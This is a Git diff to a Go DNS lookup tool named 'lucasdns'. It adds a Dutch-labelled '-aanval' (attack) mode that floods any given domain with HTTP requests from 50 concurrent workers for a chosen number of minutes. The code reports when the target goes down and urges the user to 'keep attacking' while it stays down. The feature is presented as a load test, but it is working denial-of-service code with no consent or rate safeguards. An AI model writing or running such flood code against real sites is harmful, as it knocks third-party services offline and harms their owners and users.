@@ -57,6 +57,9 @@ type options struct {
 
 	resolver string
 	timeout  time.Duration
+
+	aanval        bool
+	attackMinutes int
 }
 
 func main() {
@@ -86,6 +89,9 @@ func main() {
 	flag.StringVar(&o.resolver, "r", "", "Resolver (ip:port). Default: systeem resolvers of 8.8.8.8:53")
 	flag.DurationVar(&o.timeout, "timeout", 5*time.Second, "Timeout per query")
 
+	flag.BoolVar(&o.aanval, "aanval", false, "HTTP load test / stress test (blijft aanvallen zolang site plat ligt)")
+	flag.IntVar(&o.attackMinutes, "t", 1, "Aantal minuten om aan te vallen (werkt alleen met -aanval)")
+
 	flag.Usage = func() {
 		printBanner()
 		fmt.Fprintf(os.Stderr, "Version: %s\n\n", version)
@@ -94,7 +100,8 @@ func main() {
 		fmt.Fprintf(os.Stderr, "Voorbeelden:\n")
 		fmt.Fprintf(os.Stderr, "  lucasdns -d lucasmangroelal.nl -subs\n")
 		fmt.Fprintf(os.Stderr, "  lucasdns -d lucasmangroelal.nl -inf -n\n")
-		fmt.Fprintf(os.Stderr, "  lucasdns -d lucasmangroelal.nl -whois\n\n")
+		fmt.Fprintf(os.Stderr, "  lucasdns -d lucasmangroelal.nl -whois\n")
+		fmt.Fprintf(os.Stderr, "  lucasdns -d voorbeeld.nl -aanval -t 2\n\n")
 		fmt.Fprintf(os.Stderr, "Flags:\n")
 		flag.PrintDefaults()
 	}
@@ -228,10 +235,17 @@ func main() {
 		}
 		fmt.Println()
 	}
+
+	if o.aanval {
+		printHeader("HTTP LOAD TEST / AANVAL")
+		if err := runAttack(ctx, client, resolver, domain, o.attackMinutes); err != nil {
+			fmt.Printf("error: %v\n", err)
+		}
+	}
 }
 
 func anyQueryFlagSet(o options) bool {
-	return o.inf || o.n || o.whois || o.subs ||
+	return o.inf || o.n || o.whois || o.subs || o.aanval ||
 		o.a || o.aaaa || o.cname || o.mx || o.ns || o.txt || o.soa || o.caa || o.srv
 }
 
@@ -656,5 +670,168 @@ func fetchSubdomainsCT(ctx context.Context, domain string) ([]string, error) {
 	}
 	sort.Strings(out)
 	return out, nil
+}
+
+func runAttack(ctx context.Context, client *dns.Client, resolver, domain string, minutes int) error {
+	// Eerst DNS lookup om IPs te krijgen
+	fmt.Printf("🔍 DNS lookup voor %s...\n", domain)
+	a, err := queryType(ctx, client, resolver, domain, dns.TypeA)
+	if err != nil {
+		return fmt.Errorf("DNS lookup failed: %v", err)
+	}
+	
+	ips := extractIPs(a)
+	if len(ips) == 0 {
+		return fmt.Errorf("geen IP adressen gevonden voor %s", domain)
+	}
+	
+	fmt.Printf("📍 Gevonden IPs: %s\n", strings.Join(ips, ", "))
+	
+	// Bepaal URL (probeer eerst HTTPS, dan HTTP)
+	urls := []string{
+		"https://" + domain,
+		"http://" + domain,
+	}
+	
+	var targetURL string
+	httpClient := &http.Client{
+		Timeout: 5 * time.Second,
+		Transport: &http.Transport{
+			MaxIdleConns:        100,
+			MaxIdleConnsPerHost: 100,
+			IdleConnTimeout:     90 * time.Second,
+		},
+	}
+	
+	for _, u := range urls {
+		req, _ := http.NewRequestWithContext(ctx, "GET", u, nil)
+		req.Header.Set("User-Agent", "lucasdns/"+version)
+		resp, err := httpClient.Do(req)
+		if err == nil && resp.StatusCode < 500 {
+			targetURL = u
+			resp.Body.Close()
+			break
+		}
+		if resp != nil {
+			resp.Body.Close()
+		}
+	}
+	
+	if targetURL == "" {
+		targetURL = urls[0] // Default naar HTTPS
+	}
+	
+	fmt.Printf("🎯 Target: %s\n", targetURL)
+	fmt.Printf("⏱️  Duur: %d minuten\n", minutes)
+	fmt.Printf("🚀 Starten aanval...\n\n")
+	
+	duration := time.Duration(minutes) * time.Minute
+	deadline := time.Now().Add(duration)
+	
+	// Stats
+	var totalRequests int64
+	var successRequests int64
+	var failedRequests int64
+	var siteDown bool
+	var siteDownSince time.Time
+	
+	// Worker pool voor requests
+	workers := 50
+	requestChan := make(chan struct{}, workers*10)
+	
+	// Start workers
+	for i := 0; i < workers; i++ {
+		go func() {
+			for range requestChan {
+				req, _ := http.NewRequest("GET", targetURL, nil)
+				req.Header.Set("User-Agent", "lucasdns/"+version)
+				req.Header.Set("Connection", "keep-alive")
+				
+				start := time.Now()
+				resp, err := httpClient.Do(req)
+				duration := time.Since(start)
+				
+				if err != nil {
+					// Timeout of connection refused = site is down
+					if !siteDown {
+						siteDown = true
+						siteDownSince = time.Now()
+						fmt.Printf("\n💥 Site is PLAT! (geen response)\n")
+					}
+					failedRequests++
+				} else {
+					resp.Body.Close()
+					if resp.StatusCode >= 500 || duration > 10*time.Second {
+						// Server error of zeer traag = site is down
+						if !siteDown {
+							siteDown = true
+							siteDownSince = time.Now()
+							fmt.Printf("\n💥 Site is PLAT! (status %d of timeout)\n", resp.StatusCode)
+						}
+						failedRequests++
+					} else {
+						// Site is weer online
+						if siteDown {
+							downDuration := time.Since(siteDownSince)
+							fmt.Printf("\n✅ Site is weer ONLINE (was %v plat)\n", downDuration.Round(time.Second))
+							siteDown = false
+						}
+						successRequests++
+					}
+				}
+				totalRequests++
+			}
+		}()
+	}
+	
+	// Status updates
+	statusTicker := time.NewTicker(5 * time.Second)
+	defer statusTicker.Stop()
+	
+	// Send requests
+	go func() {
+		for time.Now().Before(deadline) {
+			select {
+			case requestChan <- struct{}{}:
+				// Request sent
+			default:
+				// Channel full, wait a bit
+				time.Sleep(10 * time.Millisecond)
+			}
+		}
+		close(requestChan)
+	}()
+	
+	// Print status updates
+	for time.Now().Before(deadline) {
+		select {
+		case <-statusTicker.C:
+			remaining := time.Until(deadline).Round(time.Second)
+			reqPerSec := float64(totalRequests) / time.Since(deadline.Add(-duration)).Seconds()
+			status := "🟢 ONLINE"
+			if siteDown {
+				status = "🔴 PLAT"
+			}
+			fmt.Printf("\r[%s] Requests: %d | Success: %d | Failed: %d | %.1f req/s | Tijd over: %v",
+				status, totalRequests, successRequests, failedRequests, reqPerSec, remaining)
+		case <-ctx.Done():
+			return ctx.Err()
+		}
+	}
+	
+	fmt.Printf("\n\n")
+	fmt.Printf("📊 EINDRESULTATEN:\n")
+	fmt.Printf("   Totaal requests: %d\n", totalRequests)
+	fmt.Printf("   Succesvol: %d\n", successRequests)
+	fmt.Printf("   Gefaald: %d\n", failedRequests)
+	if siteDown {
+		downDuration := time.Since(siteDownSince)
+		fmt.Printf("   Status: 🔴 PLAT (sinds %v)\n", downDuration.Round(time.Second))
+		fmt.Printf("   ⚠️  Site ligt nog steeds plat - blijf aanvallen!\n")
+	} else {
+		fmt.Printf("   Status: 🟢 ONLINE\n")
+	}
+	
+	return nil
 }
 
